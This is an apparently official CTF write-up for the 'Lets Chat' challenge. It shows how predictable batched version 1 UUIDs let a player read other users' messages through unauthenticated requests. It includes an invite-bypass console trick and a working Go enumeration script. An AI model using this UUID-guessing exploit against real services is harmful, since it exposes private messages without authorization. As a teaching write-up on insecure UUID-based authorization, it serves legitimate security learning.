# Lets Chat

Lets Chat is a chat app and the goal of the challenge is to read other users' messages. The flag is split across multiple messages in a continuously occurring conversation between two bots. Teams must snoop the whole conversation to get the flag.

# Solution

## Bypassing the invite code

On visiting the page players are presented with a form to submit an invite code. Using the form returns the message "Don't even bother". If you investigate the JavaScript, you would see this code:

```javascript
function inviteCode() {
  let c = $("#inviteCode").val();
  $.post( "/invitecode", {"code": c})
  .done(function(data) {
    $("#invite").hide()
  })
  .fail(function(data) {
    alert("You tried to guess it! tsk tsk tsk")
  })
}
```

To bypass the invite code, you could run `$("#invite").hide()` in the JavaScript console. After hiding the invite overlay you can register an account and login. 

## Understanding the application

Once logged in, you can create, join and leave chat rooms and obviously send messages. All messages appear in the chat rooms as `<Player> *******`. When you send a message, it takes a few seconds for it to show up in the chat room. If you look at the traffic you will see:

1. POST message to /message which responds with "OK"
2. A POST to /poll which returns a collection of UUIDs.
3. A GET to a different domain with the path set to the UUID which returns the content of the message (Player:*******). It's noteworthy that this request is unauthenticated. 

After sending a few messages it should be fairly obvious that there is something strange with the UUIDs. e.g. these two UUIDs are very similar:

```
19fca4c3-e97f-11eb-b0ba-5e91c0efb80a
4c0df4e7-e97f-11eb-b0ba-5e91c0efb80a
```

Digging into the UUID's a little further you can identify that they are [V1 UUIDs](https://en.wikipedia.org/wiki/Universally_unique_identifier#Versions). You can get details about the UUID from one of the many free tools online e.g. https://realityripple.com/Tools/UnUUID/:

```
Version: 1 (Date & Mac)
Variant: 1 (Standard)
Generated: 2021-07-20 17:22:47 (UTC)
Sequence: 49151
MAC Address: 5E:91:C0:EF:B8:0A
```

Reading the wikipedia artical you would see that the structure of a V1 UUID is:

> Version 1 concatenates the 48-bit MAC address of the "node" (that is, the computer generating the UUID), with a 60-bit timestamp, being the number of 100-nanosecond intervals since midnight 15 October 1582 Coordinated Universal Time (UTC)

This means that there are 10,000,000 UUIDs per second, too many to perform an online brute force attack against (although teams did try. We handled 160,000 queries per second during the CTF. Not sure if anyone's brute force succeeded though). 

CTFs don't usually require unintelligent brute forcing so perhaps there is something we can do to reduce the range of UUIDs that need to be searched. If you send lots of messages to the server, you will see intermittent "Too Fast!" error messages which is a little annoying but if you look at the UUIDs retrieved at the next /poll request you should notice something interesting. Grouping the UUID's together by their MAC address you can see entries like this:

```
33085482-e985-11eb-b0ba-5e91c0efb80a
33085484-e985-11eb-b0ba-5e91c0efb80a
33085489-e985-11eb-b0ba-5e91c0efb80a
3308548d-e985-11eb-b0ba-5e91c0efb80a
3308548f-e985-11eb-b0ba-5e91c0efb80a
313e98e5-e985-11eb-b0ba-5e91c0efb80a
313e98e8-e985-11eb-b0ba-5e91c0efb80a
313e98ed-e985-11eb-b0ba-5e91c0efb80a
313e98ef-e985-11eb-b0ba-5e91c0efb80a
313e98f1-e985-11eb-b0ba-5e91c0efb80a
2f74bc34-e985-11eb-b0ba-5e91c0efb80a
2f74bc36-e985-11eb-b0ba-5e91c0efb80a
2f74bc39-e985-11eb-b0ba-5e91c0efb80a
2f74bc3d-e985-11eb-b0ba-5e91c0efb80a
2f74bc3f-e985-11eb-b0ba-5e91c0efb80a
2daafb13-e985-11eb-b0ba-5e91c0efb80a
2daafb15-e985-11eb-b0ba-5e91c0efb80a
2daafb19-e985-11eb-b0ba-5e91c0efb80a
2daafb1e-e985-11eb-b0ba-5e91c0efb80a
2daafb20-e985-11eb-b0ba-5e91c0efb80a
2be13ec4-e985-11eb-b0ba-5e91c0efb80a
2be13eca-e985-11eb-b0ba-5e91c0efb80a
2be13ecc-e985-11eb-b0ba-5e91c0efb80a
2be13ed0-e985-11eb-b0ba-5e91c0efb80a
2be13ed2-e985-11eb-b0ba-5e91c0efb80a
```

These UUID's are much less random then they should be. If we compare the hundred nano seconds between the UUIDs we see something interesting:

```golang
package main

import (
	"fmt"
	"github.com/google/uuid"
)

func main() {
	ids := []string{
    ...
	}
	var lastsec, lastnsec int64
	for i, id := range ids {
		uid, _ := uuid.Parse(id)
		sec, nsec := uid.Time().UnixTime()
		if i > 1 {
			fmt.Printf("secdiff: %d hundred nsecdiff: %d\n", lastsec-sec, (lastnsec-nsec)/100)
		}
		lastsec = sec
		lastnsec = nsec
	}
}

```

This program outputs: 

```
secdiff: 0 hundred nsecdiff: -5
secdiff: 0 hundred nsecdiff: -4
secdiff: 0 hundred nsecdiff: -2
secdiff: 3 hundred nsecdiff: -2006
secdiff: 0 hundred nsecdiff: -3
secdiff: 0 hundred nsecdiff: -5
secdiff: 0 hundred nsecdiff: -2
secdiff: 0 hundred nsecdiff: -2
secdiff: 3 hundred nsecdiff: 6461
secdiff: 0 hundred nsecdiff: -2
secdiff: 0 hundred nsecdiff: -3
secdiff: 0 hundred nsecdiff: -4
secdiff: 0 hundred nsecdiff: -2
secdiff: 3 hundred nsecdiff: -596
secdiff: 0 hundred nsecdiff: -2
secdiff: 0 hundred nsecdiff: -4
secdiff: 0 hundred nsecdiff: -5
secdiff: 0 hundred nsecdiff: -2
secdiff: 3 hundred nsecdiff: -1828
secdiff: 0 hundred nsecdiff: -6
secdiff: 0 hundred nsecdiff: -2
secdiff: 0 hundred nsecdiff: -4
secdiff: 0 hundred nsecdiff: -2
```

It looks like every three seconds something is happening and a batch of UUIDs are being created very close together. But why the small variability in the same batch? Perhaps there are other people's messages in the same batch as your messages? You could confirm this by creating another account and checking if they receive UUIDs in the same batch.

Also notice that the batches are almost exactly 3 seconds apart (+- 6500 hundred nanoseconds increments). This means that we can guess any UUID created in the past within a range of less than 10k.

## Solution

Now we know that we can trivially read other players messages, let's see if there are any interesting messages sent in the same batch as our messages. The code below searches +-100 UUIDs from our base UUID:

```golang
package main

import (
	"fmt"
	"strings"
	"sync"

	"io/ioutil"
	"net/http"

	"encoding/binary"
	"encoding/hex"

	"github.com/google/uuid"
)

func main() {
	ids := []string{
		"3308548f-e985-11eb-b0ba-5e91c0efb80a",
		"313e98f1-e985-11eb-b0ba-5e91c0efb80a",
		"2f74bc3f-e985-11eb-b0ba-5e91c0efb80a",
		"2daafb20-e985-11eb-b0ba-5e91c0efb80a",
		"2be13ed2-e985-11eb-b0ba-5e91c0efb80a",
	}
	for _, id := range ids {
		uid, _ := uuid.Parse(id)
		wg := &sync.WaitGroup{}
		for j := 1; j < 100; j++ {
			wg.Add(2)
			go guess(encodeHex(uid, j), wg)
			go guess(encodeHex(uid, -j), wg)
		}
		wg.Wait()
	}
}

func guess(id string, wg *sync.WaitGroup) {
	defer wg.Done()
	req, _ := http.NewRequest("GET", fmt.Sprintf("http://letschat-messages-web.2021.ctfcompetition.com/%s", id), nil)
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	if strings.Contains(string(body), "No results") || strings.Contains(string(body), "Player:*******") {
		return
	}
	fmt.Printf("%s:%s\n", id, string(body))
}

func encodeHex(uid uuid.UUID, inc int) string {
	uuid, _ := uid.MarshalBinary()
	dst := [36]byte{}
	var newNanoSec uint32
	if inc < 0 {
		newNanoSec = binary.BigEndian.Uint32(uuid[0:4]) - uint32(inc*-1)
	} else {
		newNanoSec = binary.BigEndian.Uint32(uuid[0:4]) + uint32(inc)
	}
	newNanoSecSlice := [4]byte{}
	binary.BigEndian.PutUint32(newNanoSecSlice[:], newNanoSec)
	hex.Encode(dst[:], newNanoSecSlice[:])
	dst[8] = '-'
	hex.Encode(dst[9:13], uuid[4:6])
	dst[13] = '-'
	hex.Encode(dst[14:18], uuid[6:8])
	dst[18] = '-'
	hex.Encode(dst[19:23], uuid[8:10])
	dst[23] = '-'
	hex.Encode(dst[24:], uuid[10:])
	return string(dst[:])
}
```

Filtering out "No Results" and and "Player:*******" we see that there is one unusual message per "batch" of messages:

```
2be13ebd-e985-11eb-b0ba-5e91c0efb80a:AzureDiamond:oh, ok.
2daafb0c-e985-11eb-b0ba-5e91c0efb80a:Cthon98:hey, if you type in your pw, it will show as stars
2f74bc2e-e985-11eb-b0ba-5e91c0efb80a:Cthon98:********* see!
313e98dc-e985-11eb-b0ba-5e91c0efb80a:AzureDiamond:FLAG_PART_1[ctf{chat]
3308547c-e985-11eb-b0ba-5e91c0efb80a:AzureDiamond:doesnt look like stars to me
```

Keep searching and you will eventually get the [hunter2](https://knowyourmeme.com/memes/hunter2) meme conversation and all the parts of the flag:

```
Cthon98:hey, if you type in your pw, it will show as stars
Cthon98:********* see!
AzureDiamond:FLAG_PART_1[ctf{chat]
AzureDiamond:doesnt look like stars to me
Cthon98:AzureDiamond *******
Cthon98:thats what I see
AzureDiamond:oh, really?
Cthon98:Absolutely
AzureDiamond:you can go FLAG_PART_2[your] my FLAG_PART_3[way]-ing FLAG_PART_4[to]
AzureDiamond:haha, does that look funny to you?
Cthon98:lol, yes. See, when YOU type FLAG_PART_5[the], it shows to us as *******
AzureDiamond:thats neat, I didnt know Lack did that
Cthon98:yep, no matter how many times you type FLAG_PART_6[winning], it will show to us as *******
AzureDiamond:awesome!
AzureDiamond:wait, how do you know my pw?
Cthon98:er, I just copy pasted YOUR ******'s and it appears to YOU as FLAG_PART_7_FINAL_PART[flag}] cause its your pw
AzureDiamond:oh, ok.
```

## Problems

Although it was probably obvious that the goal of the challenge was to read some messages, it was not obvious that there is a bot message in every batch of messages. Unfortunately, one team solved the challenge early and we decided not to add any hints as it would have been unfair to the teams that were able to solve it.

At launch, players could actually send messages to each other. It took ~30 seconds before offensive material started to be posted to the "public" room and after some complaints we censored all the messages. This made it more obvious that XSS was not the intended solution.

## Inspiration

This challenge was inspired by real world applications that rely on the unguessability of UUIDs as authorization. Especially when using V1 UUIDs (which aren't random) and double especially when creating batches of V1 UUIDs which makes predicting them trivial.